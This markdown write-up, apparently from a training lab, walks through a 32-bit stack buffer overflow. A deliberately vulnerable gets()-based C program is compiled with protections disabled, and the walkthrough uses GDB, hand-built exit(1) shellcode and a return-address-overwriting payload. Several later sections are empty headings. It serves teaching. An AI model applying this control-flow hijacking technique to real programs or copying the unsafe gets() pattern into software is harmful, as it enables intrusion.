---
title: Buffer overflow to exit
date: 2024-02-24
author:
  - "0x42697262"
  - Orochi
  - Jinx
---

# Buffer overflow to exit

## TL;DR

Open GDB

```sh
gdb vuln
```

Run the program once

```
(gdb) run
```

Then exit (CTRL+C) and dissassemble the symbol `vuln`

```
(gdb) disassemble vuln
Dump of assembler code for function vuln:
   0x5655617d <+0>:     push    %ebp
   0x5655617e <+1>:     mov     %esp,%ebp
   0x56556180 <+3>:     sub     $0x8,%esp
   0x56556183 <+6>:     lea     -0x8(%ebp),%eax
   0x56556186 <+9>:     push    %eax
   0x56556187 <+10>:    call    0xf7c741b0 <_IO_gets>
   0x5655618c <+15>:    add     $0x4,%esp
   0x5655618f <+18>:    nop
   0x56556190 <+19>:    leave
   0x56556191 <+20>:    ret
End of assembler dump.
```

Add a breakpoint on the first instruction and run it once again

```
(gdb) break *0x5655617d
Breakpoint 1 at 0x5655617d: file vuln.c, line 3.
(gdb) run
Breakpoint 1, vuln () at vuln.c:3
3	void vuln() {
```

Print the address of the variable `buffer`

```
(gdb) print &buffer
```

Craft the exploit with the shellcode payload and memory address of the `buffer`

```
\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff
```

Execute the exploit inside GDB

```
(gdb) r <<< $(echo -ne "\x31\xc0\x40\x89\xc3\xcd\x80\x90\x90\x90\x90\x90\x18\xcd\xff\xff")
```

The program should terminate with the exit status code `1`

```
[Inferior 1 (process 1027954) exited with code 01]
```

---

## Introduction

A vulnerable C source code is provided that accepts an unbounded number of non-null byte characters from standard input.
The goal is to construct a **shellcode** to cause the program to terminate with a desired **exit code** of `1` using a stack smashing attack.

Note that crashes due to malformed "shellcode" will not result in an exit code of `1` and therefore will not count.

---

## Pre-requisites

### Vulnerable C Source Code

```c
// vuln.c
#include <stdio.h>

void vuln() {
    char buffer[8];
    gets(buffer);
}

int main() {
    vuln();
    while (1) {
    }
}
```

### Tools

- GNU Compiler Collection (GCC)
- GNU Debugger (GDB)
- Netwide Assembler (NASM)
- objdump

### Compilation with disabled security protections

```sh
$ gcc -m32 -fno-stack-protector -mpreferred-stack-boundary=2 -fno-pie -ggdb -z execstack vuln.c -o vuln
```

- `-fno-stack-protector` disables stack smashing protection.
- `-m32` generate 32-bit architecture code.
- `-mpreferred-stack-boundary=2` stack boundary should be aligned in 4 bytes.
- `-ggdb` generate debug information compatible with the GDB debugger.
- `-fno-pie` disables position-independent executable (PIE) generation which randomizes the base address of the executable.
- `-z execstack` sets the stack as executable.

This compilation step is necessary otherwise it would almost be a bit harder to execute this type of buffer overflow.

```
*** stack smashing detected ***: terminated
[1]    1024635 IOT instruction (core dumped)
```

### Shellcode

Generally, we should acquire the shellcode somewhere like Shell-Storm.
But for the sake of learning, we can generate our own shellcode.
Knowledge in assembly language would be needed.
We have this shellcode that terminates the program with exit status code `1`

```asm
section .text
global main

main:
    xor eax, eax   ; Clear EAX register
    inc eax        ; Increment EAX to 1
    mov ebx, eax   ; Move the value of EAX into EBX (not %eab)
    int 0x80       ; Invoke system call
```

To compile,

```sh
$ nasm -f elf32 shellcode.asm -o shellcode.o
```

This should output an ELF LSB relocatable code `ELF 32-bit LSB relocatable, Intel 80386, version 1 (SYSV), not stripped`.
To acquire the shellcode to be used for the explotation payload, we can use `objdump`

```sh
$ objdump -M intel -d solutions/shellcode.o
```

Its output would be

```
solutions/shellcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <main>:
   0:   31 c0                   xor    eax,eax
   2:   40                      inc    eax
   3:   89 c3                   mov    ebx,eax
   5:   cd 80                   int    0x80
```

Putting all the bytes together, our shellcode is

```
\x31\xc0\x40\x89\xc3\xcd\x80
```

Which is just 7 bytes long.

## Methodology

---

### Enumeration

### Exploitation

## Documentation of Proofs

---

## Conclusion

---

## Acknowledgement and References

- [LiveOverflow](https://www.youtube.com/@LiveOverflow) for usage of GDB
- [Phrack Volume 7 Issue 49: Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) for teaching us on smashing the stack
- [Practical Binary Analysis](https://practicalbinaryanalysis.com/) for teaching assembly and basics of ELF
- [Shell-Storm](https://shell-storm.org/shellcode/index.html) for providing shellcodes
